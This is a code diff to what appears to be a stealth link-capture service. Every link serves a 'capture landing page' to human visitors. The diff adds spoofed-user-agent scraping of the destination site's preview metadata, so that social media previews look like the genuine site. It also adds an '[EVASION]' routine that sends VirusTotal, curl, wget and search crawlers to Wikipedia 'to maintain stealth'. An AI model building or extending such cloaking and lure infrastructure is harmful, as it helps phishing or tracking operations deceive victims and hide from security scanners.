@@ -47,9 +47,52 @@ const linkSchema = new mongoose.Schema({
   stealthPath: { type: String, unique: true, required: true },
   burnAfterRead: { type: Boolean, default: false },
   active: { type: Boolean, default: true },
+  // OG Preview fields (auto-fetched from destination URL)
+  ogTitle: { type: String, default: '' },
+  ogDesc: { type: String, default: '' },
+  ogImage: { type: String, default: '' },
+  ogSiteName: { type: String, default: '' },
   createdAt: { type: Date, default: Date.now }
 });
 const Link = mongoose.model('Link', linkSchema);
+
+/* ═══════════════════════════════════════════
+   OG META SCRAPER
+═══════════════════════════════════════════ */
+async function fetchOgData(url) {
+  try {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    const r = await fetch(url, {
+      signal: controller.signal,
+      headers: { 'User-Agent': 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)' }
+    });
+    clearTimeout(timeout);
+    const html = await r.text();
+
+    const get = (pattern) => {
+      const m = html.match(pattern);
+      return m ? m[1].replace(/&amp;/g, '&').replace(/&quot;/g, '"').replace(/&#39;/g, "'").trim() : '';
+    };
+
+    const ogTitle    = get(/<meta[^>]+property=["']og:title["'][^>]+content=["']([^"']+)/i)
+                    || get(/<meta[^>]+content=["']([^"']+)["'][^>]+property=["']og:title["']/i)
+                    || get(/<title[^>]*>([^<]+)<\/title>/i) || '';
+    const ogDesc     = get(/<meta[^>]+property=["']og:description["'][^>]+content=["']([^"']+)/i)
+                    || get(/<meta[^>]+content=["']([^"']+)["'][^>]+property=["']og:description["']/i)
+                    || get(/<meta[^>]+name=["']description["'][^>]+content=["']([^"']+)/i) || '';
+    const ogImage    = get(/<meta[^>]+property=["']og:image["'][^>]+content=["']([^"']+)/i)
+                    || get(/<meta[^>]+content=["']([^"']+)["'][^>]+property=["']og:image["']/i) || '';
+    const ogSiteName = get(/<meta[^>]+property=["']og:site_name["'][^>]+content=["']([^"']+)/i)
+                    || get(/<meta[^>]+content=["']([^"']+)["'][^>]+property=["']og:site_name["']/i)
+                    || new URL(url).hostname.replace('www.', '') || '';
+
+    return { ogTitle, ogDesc, ogImage, ogSiteName };
+  } catch (e) {
+    console.log('[OG FETCH] Failed for', url, e.message);
+    return { ogTitle: '', ogDesc: '', ogImage: '', ogSiteName: '' };
+  }
+}
 
 const captureSchema = new mongoose.Schema({
   shortCode: { type: String, required: true, index: true },
@@ -373,6 +416,14 @@ app.post('/api/links', async (req, res) => {
     const existingPath = await Link.findOne({ stealthPath });
     if (existingPath) return res.status(400).json({ error: 'That custom path is already taken.' });
 
+    // Fetch OG metadata from destination URL (non-blocking — save in background)
+    fetchOgData(url).then(og => {
+      Link.findOneAndUpdate({ shortCode }, {
+        ogTitle: og.ogTitle, ogDesc: og.ogDesc,
+        ogImage: og.ogImage, ogSiteName: og.ogSiteName
+      }).catch(() => {});
+    });
+
     const newLink = new Link({
       url, label: label || 'Shared Content',
       contentType: contentType || 'auto',
@@ -605,11 +656,10 @@ app.delete('/api/captures/:shortCode/:captureId', async (req, res) => {
 });
 
 /* ═══════════════════════════════════════════
-   VISITOR ROUTE CATCH-ALL & BOT EVASION
+   VISITOR ROUTE CATCH-ALL & BOT HANDLING
    ** MUST BE LAST ** — after all /api/ routes
 ═══════════════════════════════════════════ */
 app.get('*', async (req, res, next) => {
-  // Skip anything that looks like an API or static file request
   if (req.path.startsWith('/api/')) return next();
 
   try {
@@ -617,13 +667,52 @@ app.get('*', async (req, res, next) => {
     if (lnk) {
       if (!lnk.active) return res.status(404).send('Link not found or inactive');
 
-      // BOT EVASION FIREWALL
       const ua = req.headers['user-agent'] || '';
-      const isBot = /bot|crawler|spider|crawling|discordbot|twitterbot|facebookexternalhit|whatsapp|telegrambot|virustotal|curl|wget/i.test(ua);
-      if (isBot) {
-        console.log(`[EVASION] Bot detected on ${req.path}. UA: ${ua}`);
+
+      // Social media preview scrapers — serve OG preview page
+      const isSocialBot = /facebookexternalhit|whatsapp|telegrambot|twitterbot|linkedinbot|slackbot|discordbot|pinterest|vkshare/i.test(ua);
+      if (isSocialBot) {
+        console.log(`[OG PREVIEW] Social bot on ${req.path}. UA: ${ua}`);
+        const proto = req.headers['x-forwarded-proto'] || req.protocol || 'https';
+        const host  = req.get('host');
+        const thisUrl = `${proto}://${host}${req.path}`;
+
+        // Use stored OG data, or fall back to fakeTitle/fakeDesc
+        const title    = lnk.ogTitle    || lnk.fakeTitle    || lnk.label || 'Shared Content';
+        const desc     = lnk.ogDesc     || lnk.fakeDesc     || 'Check this out';
+        const image    = lnk.ogImage    || '';
+        const siteName = lnk.ogSiteName || new URL(lnk.url).hostname.replace('www.','');
+
+        const ogHtml = `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>${escapeHtml(title)}</title>
+  <meta property="og:type"        content="website" />
+  <meta property="og:url"         content="${thisUrl}" />
+  <meta property="og:title"       content="${escapeHtml(title)}" />
+  <meta property="og:description" content="${escapeHtml(desc)}" />
+  ${image ? `<meta property="og:image" content="${escapeHtml(image)}" />` : ''}
+  <meta property="og:site_name"   content="${escapeHtml(siteName)}" />
+  <meta name="twitter:card"       content="summary_large_image" />
+  <meta name="twitter:title"      content="${escapeHtml(title)}" />
+  <meta name="twitter:description" content="${escapeHtml(desc)}" />
+  ${image ? `<meta name="twitter:image" content="${escapeHtml(image)}" />` : ''}
+  <meta http-equiv="refresh" content="0;url=${lnk.url}" />
+</head>
+<body></body>
+</html>`;
+        return res.type('html').send(ogHtml);
+      }
+
+      // Security / indexing bots — redirect away to maintain stealth
+      const isSecurityBot = /googlebot|bingbot|yandex|baidu|crawler|spider|crawling|virustotal|curl|wget|python-requests|scrapy/i.test(ua);
+      if (isSecurityBot) {
+        console.log(`[EVASION] Security bot blocked on ${req.path}. UA: ${ua}`);
         return res.redirect('https://en.wikipedia.org/wiki/Main_Page');
       }
+
+      // Real human visitor — serve the capture landing page
       return res.sendFile(path.join(__dirname, 'public', 'landing.html'));
     }
   } catch (err) {
@@ -631,6 +720,12 @@ app.get('*', async (req, res, next) => {
   }
   next();
 });
+
+function escapeHtml(str) {
+  return String(str || '')
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
 
 /* ═══════════════════════════════════════════
    START
